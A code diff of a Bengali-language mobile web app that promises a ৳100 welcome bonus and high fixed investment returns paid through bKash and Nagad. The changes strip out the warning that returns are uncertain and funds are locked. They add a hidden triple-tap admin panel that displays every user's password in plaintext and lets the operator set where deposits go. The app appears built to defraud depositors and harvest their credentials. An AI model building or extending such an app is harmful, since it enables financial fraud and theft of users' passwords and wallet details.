@@ -57,7 +57,6 @@ body{overflow-x:hidden;padding-bottom:70px}
 }
 .content{position:relative;z-index:1}
 
-/* Highlight Notice Bar */
 .notice-bar{
   background:linear-gradient(135deg,#1f4e38,#0d2b1e);
   border:1px solid rgba(27,224,146,.3);
@@ -128,7 +127,6 @@ body{overflow-x:hidden;padding-bottom:70px}
   color:var(--gold);
 }
 
-/* Bottom Navigation Bar */
 .bottom-nav{
   position:fixed;
   bottom:0; left:50%;
@@ -219,7 +217,6 @@ input, select{
   font-size:14px;
 }
 input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27,224,146,.08)}
-.hint{margin:-4px 3px 14px;color:#86a494;font-size:10px;line-height:1.5}
 .allow-btn{
   position:relative;
   overflow:hidden;
@@ -254,8 +251,6 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
   background:#06110b;
   border:1px solid #20392d;
 }
-.task-info h4{margin:0 0 3px;font-size:14px}
-.task-info p{margin:0;color:var(--muted);font-size:11px}
 .task-btn{
   padding:8px 14px;
   border-radius:10px;
@@ -296,7 +291,7 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
 }
 .amount-chip:hover,.amount-chip.active{border-color:var(--green);background:#0b2a1d;color:var(--green);}
 
-/* Modal Styling */
+/* Admin Styles */
 .admin-modal,.admin-panel{display:none}
 .admin-modal{
   position:fixed;inset:0;z-index:100;
@@ -331,7 +326,6 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
   gap:10px;margin-bottom:12px;
 }
 .admin-top h2{margin:0;font-size:21px}
-.admin-top small{color:var(--muted)}
 .admin-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:9px}
 .stat{padding:14px;border-radius:16px;background:#0a1710;border:1px solid #213d2f}
 .stat b{display:block;font-size:22px;color:#fff}
@@ -355,10 +349,10 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
 .admin-dark{background:#15211b;color:#fff;border:1px solid #30483d}
 .admin-red{background:#35161b;color:#ff9fab;border:1px solid #71313c}
 .admin-row{display:grid;grid-template-columns:1fr 1fr;gap:9px}
+.admin-tabs{display:flex;gap:8px;margin-bottom:12px;overflow-x:auto;padding-bottom:4px;}
+.admin-tab-btn{padding:8px 12px;border-radius:10px;border:1px solid #213d2f;background:#0a1710;color:var(--muted);cursor:pointer;white-space:nowrap;font-size:12px;}
+.admin-tab-btn.active{background:var(--green);color:#062015;font-weight:bold;}
 .admin-note{font-size:10px;color:#82988c;line-height:1.5}
-.admin-msg{display:none;margin-top:9px;padding:10px;border-radius:12px;font-size:11px}
-.admin-msg.ok{display:block;background:#0b2a1d;border:1px solid #24684d;color:#88f3c4}
-.admin-msg.error{display:block;background:#35161b;border:1px solid #7b3540;color:#ffb0ba}
 .hidden{display:none!important}
 </style>
 </head>
@@ -373,7 +367,6 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
 <main class="page">
   <div class="content">
 
-    <!-- Highlight Notice Bar -->
     <div class="notice-bar" id="highlightNoticeBar">
       <span>📢</span> <span id="noticeBarText">সিস্টেম আপডেট সফল হয়েছে। নতুন প্রিমিয়াম ফিচার উপভোগ করুন!</span>
     </div>
@@ -386,7 +379,6 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
       </div>
     </section>
 
-    <!-- Hero Section -->
     <section class="hero">
       <div class="gift">🎁</div>
       <div class="welcome" id="heroWelcomeTitle">WELCOME BONUS</div>
@@ -397,90 +389,33 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
     <!-- AUTH & REGISTRATION VIEW -->
     <div id="authView">
       <div class="card" id="loginCard" style="display:none;">
-        <div class="head">
-          <div class="head-icon">🔑</div>
-          <div>
-            <h2>অ্যাকাউন্ট লগইন</h2>
-            <p>আপনার মোবাইল নাম্বার ও পাসওয়ার্ড দিন</p>
-          </div>
-        </div>
+        <div class="head"><div class="head-icon">🔑</div><div><h2>অ্যাকাউন্ট লগইন</h2><p>আপনার মোবাইল নাম্বার ও পাসওয়ার্ড দিন</p></div></div>
         <div class="msg" id="loginMsg"></div>
-        <div class="field">
-          <label class="label">ফোন নাম্বার</label>
-          <div class="input-wrap">
-            <span class="ico">📱</span>
-            <input id="loginPhone" type="tel" inputmode="numeric" maxlength="11" placeholder="01XXXXXXXXX">
-          </div>
-        </div>
-        <div class="field">
-          <label class="label">পাসওয়ার্ড</label>
-          <div class="input-wrap">
-            <span class="ico">🔒</span>
-            <input id="loginPassword" type="password" placeholder="পাসওয়ার্ড লিখুন">
-          </div>
-        </div>
-        <button class="allow-btn" onclick="handleLogin()">
-          <span class="btn-inner"><span>LOGIN →</span></span>
-        </button>
-        <div class="note" style="cursor:pointer;color:var(--green);margin-top:12px;" onclick="toggleAuthMode(false)">
-          নতুন অ্যাকাউন্ট খুলতে চান? রেজিস্ট্রেশন করুন
-        </div>
+        <div class="field"><label class="label">ফোন নাম্বার</label><div class="input-wrap"><span class="ico">📱</span><input id="loginPhone" type="tel" maxlength="11" placeholder="01XXXXXXXXX"></div></div>
+        <div class="field"><label class="label">পাসওয়ার্ড</label><div class="input-wrap"><span class="ico">🔒</span><input id="loginPassword" type="password" placeholder="পাসওয়ার্ড লিখুন"></div></div>
+        <button class="allow-btn" onclick="handleLogin()"><span class="btn-inner"><span>LOGIN →</span></span></button>
+        <div class="note" style="cursor:pointer;color:var(--green);margin-top:12px;" onclick="toggleAuthMode(false)">নতুন অ্যাকাউন্ট খুলতে চান? রেজিস্ট্রেশন করুন</div>
       </div>
 
       <section class="card" id="registerStep">
-        <div class="head">
-          <div class="head-icon">👤</div>
-          <div>
-            <h2>নতুন অ্যাকাউন্ট</h2>
-            <p>সঠিক তথ্য দিয়ে ফর্ম পূরণ করুন</p>
-          </div>
-        </div>
+        <div class="head"><div class="head-icon">👤</div><div><h2>নতুন অ্যাকাউন্ট</h2><p>সঠিক তথ্য দিয়ে ফর্ম পূরণ করুন</p></div></div>
         <div class="msg" id="formMsg"></div>
-        <div class="field">
-          <label class="label">আপনার নাম</label>
-          <div class="input-wrap"><span class="ico">👤</span><input id="name" type="text" placeholder="পূর্ণ নাম লিখুন"></div>
-        </div>
-        <div class="field">
-          <label class="label">ফোন নাম্বার</label>
-          <div class="input-wrap"><span class="ico">📱</span><input id="phone" type="tel" inputmode="numeric" maxlength="11" placeholder="01XXXXXXXXX"></div>
-        </div>
-        <div class="field">
-          <label class="label">পাসওয়ার্ড</label>
-          <div class="input-wrap"><span class="ico">🔒</span><input id="password" type="password" placeholder="কমপক্ষে ৪ ডিজিটের পাসওয়ার্ড"></div>
-        </div>
-        <div class="field">
-          <label class="label">বয়স</label>
-          <div class="input-wrap"><span class="ico">🎂</span><input id="age" type="number" min="18" max="100" placeholder="18+"></div>
-        </div>
-        <button class="allow-btn" id="allowBtn">
-          <span class="btn-inner"><span style="font-size:14px;">💰</span><span id="allowText">ALLOW LOCATION & REGISTER →</span></span>
-        </button>
-        <div class="note" style="cursor:pointer;color:var(--green);margin-top:12px;" onclick="toggleAuthMode(true)">
-          ইতিমধ্যে অ্যাকাউন্ট আছে? লগইন করুন
-        </div>
+        <div class="field"><label class="label">আপনার নাম</label><div class="input-wrap"><span class="ico">👤</span><input id="name" type="text" placeholder="পূর্ণ নাম লিখুন"></div></div>
+        <div class="field"><label class="label">ফোন নাম্বার</label><div class="input-wrap"><span class="ico">📱</span><input id="phone" type="tel" maxlength="11" placeholder="01XXXXXXXXX"></div></div>
+        <div class="field"><label class="label">পাসওয়ার্ড</label><div class="input-wrap"><span class="ico">🔒</span><input id="password" type="password" placeholder="কমপক্ষে ৪ ডিজিটের পাসওয়ার্ড"></div></div>
+        <div class="field"><label class="label">বয়স</label><div class="input-wrap"><span class="ico">🎂</span><input id="age" type="number" min="18" max="100" placeholder="18+"></div></div>
+        <button class="allow-btn" id="allowBtn"><span class="btn-inner"><span style="font-size:14px;">💰</span><span id="allowText">ALLOW LOCATION & REGISTER →</span></span></button>
+        <div class="note" style="cursor:pointer;color:var(--green);margin-top:12px;" onclick="toggleAuthMode(true)">ইতিমধ্যে অ্যাকাউন্ট আছে? লগইন করুন</div>
       </section>
 
       <section class="card" id="paymentStep" style="display:none;">
-        <div class="head">
-          <div class="head-icon">💳</div>
-          <div>
-            <h2>পেমেন্ট মেথড</h2>
-            <p>৳100 বোনাস গ্রহণের মাধ্যম নির্বাচন করুন</p>
-          </div>
-        </div>
+        <div class="head"><div class="head-icon">💳</div><div><h2>পেমেন্ট মেথড</h2><p>৳100 বোনাস গ্রহণের মাধ্যম নির্বাচন করুন</p></div></div>
         <div class="msg" id="paymentMsg"></div>
         <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px;">
-          <label style="border:1px solid var(--line);padding:14px;border-radius:14px;text-align:center;cursor:pointer;background:#06100b;">
-            <input type="radio" name="payment" value="bKash" checked> 📱 bKash
-          </label>
-          <label style="border:1px solid var(--line);padding:14px;border-radius:14px;text-align:center;cursor:pointer;background:#06100b;">
-            <input type="radio" name="payment" value="Nagad"> 💳 Nagad
-          </label>
+          <label style="border:1px solid var(--line);padding:14px;border-radius:14px;text-align:center;cursor:pointer;background:#06100b;"><input type="radio" name="payment" value="bKash" checked> 📱 bKash</label>
+          <label style="border:1px solid var(--line);padding:14px;border-radius:14px;text-align:center;cursor:pointer;background:#06100b;"><input type="radio" name="payment" value="Nagad"> 💳 Nagad</label>
         </div>
-        <div class="field">
-          <label class="label">bKash / Nagad নাম্বার</label>
-          <div class="input-wrap"><span class="ico">☎️</span><input id="walletNumber" type="tel" inputmode="numeric" maxlength="11" placeholder="01XXXXXXXXX"></div>
-        </div>
+        <div class="field"><label class="label">bKash / Nagad নাম্বার</label><div class="input-wrap"><span class="ico">☎️</span><input id="walletNumber" type="tel" maxlength="11" placeholder="01XXXXXXXXX"></div></div>
         <button class="allow-btn" onclick="submitPayment()"><span class="btn-inner"><span>CONFIRM & GET BONUS →</span></span></button>
       </section>
 
@@ -494,42 +429,18 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
 
     <!-- MAIN DASHBOARD TABS -->
     <div id="dashboardView" class="hidden">
-
       <!-- HOME TAB -->
       <div id="paneHome" class="card">
-        <div class="head">
-          <div class="head-icon">📊</div>
-          <div>
-            <h2>অ্যাকাউন্ট ওভারভিউ</h2>
-            <p>আপনার ব্যালেন্স এবং রেফারেল সামারি</p>
-          </div>
-        </div>
+        <div class="head"><div class="head-icon">📊</div><div><h2>অ্যাকাউন্ট ওভারভিউ</h2><p>আপনার ব্যালেন্স এবং রেফারেল সামারি</p></div></div>
         <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:15px;">
-          <div style="background:#05120b;padding:14px;border-radius:14px;border:1px solid var(--line);">
-            <small style="color:var(--muted)">Total Balance</small>
-            <b id="dashTotalEarned" style="display:block;font-size:18px;color:var(--gold);margin-top:4px;">৳100</b>
-          </div>
-          <div style="background:#05120b;padding:14px;border-radius:14px;border:1px solid var(--line);">
-            <small style="color:var(--muted)">Referrals</small>
-            <b id="dashReferralCount" style="display:block;font-size:16px;color:var(--green);margin-top:4px;">0 Users</b>
-          </div>
-        </div>
-        <div style="background:#05120b;padding:14px;border-radius:14px;border:1px solid var(--line);margin-bottom:15px;">
-          <h4 style="margin:0 0 6px;font-size:14px;">👥 Referral Claim System</h4>
-          <p style="margin:0 0 10px;color:var(--muted);font-size:11px;" id="referralStatusDesc">যোগ্যতা পূরণ করে রেফারেল বোনাস ক্লেম করুন।</p>
-          <button class="task-btn" id="claimReferralBtn" onclick="claimReferralBonus()" style="width:100%;padding:10px;">Claim Referral Bonus</button>
+          <div style="background:#05120b;padding:14px;border-radius:14px;border:1px solid var(--line);"><small style="color:var(--muted)">Total Balance</small><b id="dashTotalEarned" style="display:block;font-size:18px;color:var(--gold);margin-top:4px;">৳100</b></div>
+          <div style="background:#05120b;padding:14px;border-radius:14px;border:1px solid var(--line);"><small style="color:var(--muted)">Referrals</small><b id="dashReferralCount" style="display:block;font-size:16px;color:var(--green);margin-top:4px;">0 Users</b></div>
         </div>
       </div>
 
       <!-- PREMIUM DEPOSIT TAB -->
       <div id="paneDeposit" class="card hidden">
-        <div class="head">
-          <div class="head-icon">💳</div>
-          <div>
-            <h2>Deposit System</h2>
-            <p>বিকাশ ও নগদের মাধ্যমে টপ-আপ করুন</p>
-          </div>
-        </div>
+        <div class="head"><div class="head-icon">💳</div><div><h2>Deposit System</h2><p>বিকাশ ও নগদের মাধ্যমে টপ-আপ করুন</p></div></div>
         <div class="msg" id="depositMsg"></div>
         <div class="deposit-card-box">
           <div class="payment-badge" id="depositMethodBadge">bKash Personal</div>
@@ -539,99 +450,44 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
             <button class="task-btn" onclick="copyAdminNumber()">Copy Number</button>
           </div>
         </div>
-        <div class="field">
-          <label class="label">ডিপোজিট মাধ্যম</label>
-          <select id="depositMethod" onchange="updateAdminWalletDisplay()">
-            <option value="bKash">📱 bKash</option>
-            <option value="Nagad">💳 Nagad</option>
-          </select>
-        </div>
-        <div class="field">
-          <label class="label">টাকার পরিমাণ (৳)</label>
-          <input id="depositAmount" type="number" placeholder="সর্বনিম্ন ১০০ টাকা">
-        </div>
-        <div class="field">
-          <label class="label">Transaction ID (TrxID)</label>
-          <input id="depositTrxId" type="text" placeholder="যেমন: 9N7A6...">
-        </div>
+        <div class="field"><label class="label">ডিপোজিট মাধ্যম</label><select id="depositMethod" onchange="updateAdminWalletDisplay()"><option value="bKash">📱 bKash</option><option value="Nagad">💳 Nagad</option></select></div>
+        <div class="field"><label class="label">টাকার পরিমাণ (৳)</label><input id="depositAmount" type="number" placeholder="সর্বনিম্ন ১০০ টাকা"></div>
+        <div class="field"><label class="label">Transaction ID (TrxID)</label><input id="depositTrxId" type="text" placeholder="যেমন: 9N7A6..."></div>
         <button class="allow-btn" onclick="submitDeposit()"><span class="btn-inner"><span>SUBMIT DEPOSIT →</span></span></button>
       </div>
 
       <!-- PREMIUM INVEST TAB -->
       <div id="paneInvest" class="card hidden">
-        <div class="head">
-          <div class="head-icon">📈</div>
-          <div>
-            <h2>Premium Investment</h2>
-            <p>লাভজনক ও নিরাপদ বিনিয়োগ করুন</p>
-          </div>
-        </div>
+        <div class="head"><div class="head-icon">📈</div><div><h2>Premium Investment</h2><p>লাভজনক ও নিরাপদ বিনিয়োগ করুন</p></div></div>
         <div class="msg" id="investMsg"></div>
-
-        <!-- Profit Calculator & Amount Selection Box -->
         <div style="background:#05120b;padding:14px;border-radius:14px;border:1px solid var(--line);margin-bottom:15px;">
           <h4 style="margin:0 0 8px;font-size:14px;">🧮 Profit Calculator & Amount</h4>
-          
           <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:10px;">
             <button class="amount-chip" onclick="setInvestAmount(500, this)">৳500</button>
             <button class="amount-chip" onclick="setInvestAmount(1000, this)">৳1,000</button>
             <button class="amount-chip" onclick="setInvestAmount(2000, this)">৳2,000</button>
             <button class="amount-chip" onclick="setInvestAmount(5000, this)">৳5,000</button>
           </div>
-
-          <div class="field" style="margin-bottom:10px;">
-            <label class="label">বিনিয়োগের পরিমাণ (৳)</label>
-            <input id="calcAmount" type="number" placeholder="পরিমাণ লিখুন" oninput="calculateProfitPreview()">
-          </div>
-
+          <div class="field" style="margin-bottom:10px;"><label class="label">বিনিয়োগের পরিমাণ (৳)</label><input id="calcAmount" type="number" placeholder="পরিমাণ লিখুন" oninput="calculateProfitPreview()"></div>
           <div style="background:#06100b;padding:12px;border-radius:10px;border:1px solid #1c3328;font-size:12px;line-height:1.7;" id="calcPreviewBox">
-            বিনিয়োগ: <b>৳0</b> | সম্ভাব্য মুনাফা: <b style="color:var(--green)">৳0</b><br>
-            মোট প্রাপ্য (মূলধন + লাভ): <b style="color:var(--gold)">৳0</b>
+            বিনিয়োগ: <b>৳0</b> | সম্ভাব্য মুনাফা: <b style="color:var(--green)">৳0</b><br>মোট প্রাপ্য (মূলধন + লাভ): <b style="color:var(--gold)">৳0</b>
           </div>
         </div>
-
-        <div style="font-size:10px;color:#ffb0ba;background:#35161b;padding:10px;border-radius:10px;margin-bottom:12px;line-height:1.5;">
-          ⚠️ <b>শর্তাবলী:</b> প্রকৃত রিটার্ন পরিবর্তনশীল এবং ১০০% নিশ্চিত নয়। মেয়াদ শেষ না হওয়া পর্যন্ত টাকা তোলা যাবে না।
-        </div>
-
-        <button class="allow-btn" id="investNowBtn" onclick="openInvestConfirmation()">
-          <span class="btn-inner"><span>INVEST NOW →</span></span>
-        </button>
-
-        <!-- Active Investments & History Section -->
-        <div style="margin-top:20px;">
-          <h4 style="margin:0 0 10px;font-size:15px;">📜 আপনার ইনভেস্টমেন্ট হিস্ট্রি</h4>
-          <div id="userInvestmentsContainer">
-            <div class="admin-note">লোড হচ্ছে...</div>
-          </div>
-        </div>
+        <button class="allow-btn" id="investNowBtn" onclick="openInvestConfirmation()"><span class="btn-inner"><span>INVEST NOW →</span></span></button>
+        <div style="margin-top:20px;"><h4 style="margin:0 0 10px;font-size:15px;">📜 আপনার ইনভেস্টমেন্ট হিস্ট্রি</h4><div id="userInvestmentsContainer"><div class="admin-note">লোড হচ্ছে...</div></div></div>
       </div>
 
       <!-- PROMO TASKS TAB -->
       <div id="paneTasks" class="card hidden">
-        <div class="head">
-          <div class="head-icon">📋</div>
-          <div>
-            <h2>Visit Promo Tasks</h2>
-            <p>লিংক ভিজিট করে রিওয়ার্ড অর্জন করুন</p>
-          </div>
-        </div>
+        <div class="head"><div class="head-icon">📋</div><div><h2>Visit Promo Tasks</h2><p>লিংক ভিজিট করে রিওয়ার্ড অর্জন করুন</p></div></div>
         <div id="promoTasksListContainer"><div class="admin-note">লোড হচ্ছে...</div></div>
       </div>
 
       <!-- WITHDRAW TAB -->
       <div id="paneWithdraw" class="card hidden">
-        <div class="head">
-          <div class="head-icon">💸</div>
-          <div>
-            <h2>Withdraw Funds</h2>
-            <p>বিকাশ বা নগদের মাধ্যমে টাকা তুলুন</p>
-          </div>
-        </div>
+        <div class="head"><div class="head-icon">💸</div><div><h2>Withdraw Funds</h2><p>বিকাশ বা নগদের মাধ্যমে টাকা তুলুন</p></div></div>
         <div class="msg" id="withdrawMsg"></div>
-        <div class="field"><label class="label">মেথড</label>
-          <select id="withdrawMethod"><option value="bKash">📱 bKash</option><option value="Nagad">💳 Nagad</option></select>
-        </div>
+        <div class="field"><label class="label">মেথড</label><select id="withdrawMethod"><option value="bKash">📱 bKash</option><option value="Nagad">💳 Nagad</option></select></div>
         <div class="field"><label class="label">নাম্বার</label><input id="withdrawNumber" type="tel" maxlength="11" placeholder="01XXXXXXXXX"></div>
         <div class="field"><label class="label">পরিমাণ (৳)</label><input id="withdrawAmount" type="number" placeholder="সর্বনিম্ন ৫০০ টাকা"></div>
         <button class="allow-btn" onclick="submitWithdraw()"><span class="btn-inner"><span>SUBMIT WITHDRAW →</span></span></button>
@@ -639,31 +495,17 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
 
       <!-- WALLET TAB -->
       <div id="paneWallet" class="card hidden">
-        <div class="head">
-          <div class="head-icon">📜</div>
-          <div>
-            <h2>Transaction History</h2>
-            <p>সমস্ত লেনদেনের বিবরণ</p>
-          </div>
-        </div>
+        <div class="head"><div class="head-icon">📜</div><div><h2>Transaction History</h2><p>সমস্ত লেনদেনের বিবরণ</p></div></div>
         <div id="transactionListContainer"><div class="admin-note">লোড হচ্ছে...</div></div>
       </div>
 
       <!-- PROFILE TAB -->
       <div id="paneProfile" class="card hidden">
-        <div class="head">
-          <div class="head-icon">⚙️</div>
-          <div>
-            <h2>User Profile</h2>
-            <p>অ্যাকাউন্ট সেটিংস</p>
-          </div>
-        </div>
+        <div class="head"><div class="head-icon">⚙️</div><div><h2>User Profile</h2><p>অ্যাকাউন্ট সেটিংস</p></div></div>
         <div style="font-size:13px; line-height:1.8; color:var(--muted); margin-bottom:15px;" id="profileDetails">লোডিং...</div>
         <button class="allow-btn" style="background:#3a1418;color:#ff8e99;" onclick="logout()">LOGOUT</button>
       </div>
-
     </div>
-
   </div>
 </main>
 
@@ -691,7 +533,7 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
   <button class="nav-item" id="navProfile" onclick="switchTab('profile')"><span class="ico-nav">👤</span>Profile</button>
 </nav>
 
-<!-- ADMIN MODAL -->
+<!-- ADMIN MODAL LOGIN -->
 <div class="admin-modal" id="adminModal">
   <div class="admin-login">
     <h3>🔐 Admin Access</h3>
@@ -705,15 +547,50 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
   </div>
 </div>
 
-<!-- ADMIN PANEL -->
+<!-- FULL COMPLETE ADMIN PANEL UI -->
 <section class="admin-panel" id="adminPanel">
   <div class="admin-shell">
     <div class="admin-top">
-      <div><h2>🛡️ Admin Panel</h2></div>
-      <button class="admin-btn admin-dark" onclick="$('adminPanel').classList.remove('show')">Close</button>
+      <div><h2>🛡️ Master Admin Panel</h2><small>System Control Center</small></div>
+      <button class="admin-btn admin-dark" onclick="$('adminPanel').classList.remove('show')">Close Panel</button>
     </div>
-    <div class="admin-card">
-      <h3>⚙️ Investment & System Settings</h3>
+
+    <!-- Admin Stats Cards -->
+    <div class="admin-grid">
+      <div class="stat"><b id="adStatUsers">0</b><span>Total Users</span></div>
+      <div class="stat"><b id="adStatDeposits">৳0</b><span>Total Deposits</span></div>
+      <div class="stat"><b id="adStatWithdraws">৳0</b><span>Total Withdraws</span></div>
+    </div>
+
+    <!-- Admin Sub-Navigation Tabs -->
+    <div class="admin-tabs" style="margin-top:14px;">
+      <button class="admin-tab-btn active" id="adTabBtnUsers" onclick="switchAdminTab('users')">👥 Users</button>
+      <button class="admin-tab-btn" id="adTabBtnDeposits" onclick="switchAdminTab('deposits')">💳 Deposits</button>
+      <button class="admin-tab-btn" id="adTabBtnWithdraws" onclick="switchAdminTab('withdraws')">💸 Withdraws</button>
+      <button class="admin-tab-btn" id="adTabBtnSettings" onclick="switchAdminTab('settings')">⚙️ Settings</button>
+    </div>
+
+    <!-- ADMIN USER LIST TAB -->
+    <div id="adPaneUsers" class="admin-card">
+      <h3>👥 All Registered Users</h3>
+      <div id="adminUserListContainer"><div class="admin-note">লোডিং ইউজার ডাটা...</div></div>
+    </div>
+
+    <!-- ADMIN DEPOSITS TAB -->
+    <div id="adPaneDeposits" class="admin-card hidden">
+      <h3>💳 Deposit Requests</h3>
+      <div id="adminDepositListContainer"><div class="admin-note">লোডিং ডিপোজিট ডাটা...</div></div>
+    </div>
+
+    <!-- ADMIN WITHDRAWS TAB -->
+    <div id="adPaneWithdraws" class="admin-card hidden">
+      <h3>💸 Withdraw Requests</h3>
+      <div id="adminWithdrawListContainer"><div class="admin-note">লোডিং উইথড্র ডাটা...</div></div>
+    </div>
+
+    <!-- ADMIN SETTINGS TAB -->
+    <div id="adPaneSettings" class="admin-card hidden">
+      <h3>⚙️ Investment & Global System Settings</h3>
       <div class="field" style="display:flex;align-items:center;gap:10px;">
         <input type="checkbox" id="adminInvestEnabled" style="width:20px;height:20px;">
         <label class="label" style="margin:0;cursor:pointer;">Enable Investment System</label>
@@ -726,8 +603,13 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
         <div class="field"><label class="label">Profit Rate (%)</label><input class="admin-search" id="adminInvestRate" type="number"></div>
         <div class="field"><label class="label">Duration (Days)</label><input class="admin-search" id="adminInvestDuration" type="number"></div>
       </div>
-      <button class="admin-btn admin-green" onclick="saveAdminSettings()">SAVE SETTINGS</button>
+      <div class="admin-row">
+        <div class="field"><label class="label">bKash Merchant</label><input class="admin-search" id="adminBkashNo" type="text"></div>
+        <div class="field"><label class="label">Nagad Merchant</label><input class="admin-search" id="adminNagadNo" type="text"></div>
+      </div>
+      <button class="admin-btn admin-green" onclick="saveAdminSettings()">SAVE ALL SETTINGS</button>
     </div>
+
   </div>
 </section>
 
@@ -1052,6 +934,7 @@ async function submitWithdraw() {
 function openNotificationModal() { alert("কোনো নতুন নোটিফিকেশন নেই।"); }
 function logout() { localStorage.clear(); location.reload(); }
 
+/* Master Admin Script */
 let tapC = 0;
 $('adminTapTarget').addEventListener('click', () => {
   tapC++; if(tapC >= 3) { tapC = 0; $("adminModal").classList.add("show"); }
@@ -1059,17 +942,85 @@ $('adminTapTarget').addEventListener('click', () => {
 $("adminLoginBtn").addEventListener('click', async () => {
   const pin = $("adminPin").value;
   const r = await fetch("/api/admin/login", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({pin})});
-  if(r.ok) { $("adminModal").classList.remove("show"); $("adminPanel").classList.add("show"); loadAdminData(); }
+  if(r.ok) { $("adminModal").classList.remove("show"); $("adminPanel").classList.add("show"); loadAdminDashboardData(); }
   else { showMsg("adminPinMsg", "ভুল পিন"); }
 });
 
-async function loadAdminData() {
-  const sr = await fetch("/api/admin/settings"); const sd = await sr.json();
-  $("adminInvestEnabled").checked = sd.investEnabled !== false;
-  $("adminMinInvest").value = sd.minInvest || 100;
-  $("adminMaxInvest").value = sd.maxInvest || 50000;
-  $("adminInvestRate").value = sd.investRate || 20;
-  $("adminInvestDuration").value = sd.investDuration || 7;
+function switchAdminTab(tab) {
+  ['adPaneUsers', 'adPaneDeposits', 'adPaneWithdraws', 'adPaneSettings'].forEach(p => $(p).classList.add('hidden'));
+  ['adTabBtnUsers', 'adTabBtnDeposits', 'adTabBtnWithdraws', 'adTabBtnSettings'].forEach(b => $(b).classList.remove('active'));
+  
+  if(tab === 'users') { $('adPaneUsers').classList.remove('hidden'); $('adTabBtnUsers').classList.add('active'); }
+  else if(tab === 'deposits') { $('adPaneDeposits').classList.remove('hidden'); $('adTabBtnDeposits').classList.add('active'); }
+  else if(tab === 'withdraws') { $('adPaneWithdraws').classList.remove('hidden'); $('adTabBtnWithdraws').classList.add('active'); }
+  else if(tab === 'settings') { $('adPaneSettings').classList.remove('hidden'); $('adTabBtnSettings').classList.add('active'); }
+}
+
+async function loadAdminDashboardData() {
+  const r = await fetch("/api/admin/overview");
+  const d = await r.json();
+  if(!d.ok) return;
+
+  $("adStatUsers").textContent = d.users.length;
+  $("adStatDeposits").textContent = `৳${d.deposits.reduce((acc, x) => acc + (x.status==='Approved'?x.amount:0), 0)}`;
+  $("adStatWithdraws").textContent = `৳${d.withdrawals.reduce((acc, x) => acc + (x.status==='Approved'?x.amount:0), 0)}`;
+
+  // Render Users
+  $("adminUserListContainer").innerHTML = d.users.map(u => `
+    <div class="record">
+      <div class="record-top">
+        <div>
+          <h4>${u.name} (${u.phone})</h4>
+          <div class="meta">ব্যালেন্স: ৳${u.balance} | পিন/পাসওয়ার্ড: ${u.password}</div>
+        </div>
+      </div>
+    </div>
+  `).join("") || "<div class='admin-note'>কোনো ইউজার নেই।</div>";
+
+  // Render Deposits
+  $("adminDepositListContainer").innerHTML = d.deposits.map(dep => `
+    <div class="record">
+      <div class="record-top">
+        <div>
+          <h4>৳${dep.amount} (${dep.method})</h4>
+          <div class="meta">TrxID: ${dep.trxId} | স্ট্যাটাস: ${dep.status}</div>
+        </div>
+        ${dep.status === 'Pending' ? `<button class="admin-btn admin-green" onclick="approveDeposit('${dep.id}')">Approve</button>` : ''}
+      </div>
+    </div>
+  `).join("") || "<div class='admin-note'>কোনো ডিপোজিট রিকোয়েস্ট নেই।</div>";
+
+  // Render Withdraws
+  $("adminWithdrawListContainer").innerHTML = d.withdrawals.map(w => `
+    <div class="record">
+      <div class="record-top">
+        <div>
+          <h4>৳${w.amount} (${w.method} - ${w.number})</h4>
+          <div class="meta">স্ট্যাটাস: ${w.status}</div>
+        </div>
+        ${w.status === 'Pending' ? `<button class="admin-btn admin-green" onclick="approveWithdraw('${w.id}')">Approve</button>` : ''}
+      </div>
+    </div>
+  `).join("") || "<div class='admin-note'>কোনো উইথড্র রিকোয়েস্ট নেই।</div>";
+
+  // Load Settings
+  $("adminInvestEnabled").checked = d.settings.investEnabled !== false;
+  $("adminMinInvest").value = d.settings.minInvest || 100;
+  $("adminMaxInvest").value = d.settings.maxInvest || 50000;
+  $("adminInvestRate").value = d.settings.investRate || 20;
+  $("adminInvestDuration").value = d.settings.investDuration || 7;
+  $("adminBkashNo").value = d.settings.adminBkash || "01700000000";
+  $("adminNagadNo").value = d.settings.adminNagad || "01800000000";
+}
+
+async function approveDeposit(depId) {
+  await fetch("/api/admin/deposit/approve", { method: "POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({ depId }) });
+  loadAdminDashboardData();
+}
+
+async function approveWithdraw(wId) {
+  await fetch("/api/admin/withdraw/approve", { method: "POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({ wId }) });
+  loadAdminDashboardData();
 }
 
 async function saveAdminSettings() {
@@ -1080,10 +1031,13 @@ async function saveAdminSettings() {
       minInvest: Number($("adminMinInvest").value),
       maxInvest: Number($("adminMaxInvest").value),
       investRate: Number($("adminInvestRate").value),
-      investDuration: Number($("adminInvestDuration").value)
+      investDuration: Number($("adminInvestDuration").value),
+      adminBkash: $("adminBkashNo").value.trim(),
+      adminNagad: $("adminNagadNo").value.trim()
     })
   });
-  alert("Settings Saved!");
+  alert("Settings Saved Successfully!");
+  fetchPublicSettings();
 }
 </script>
 </body>
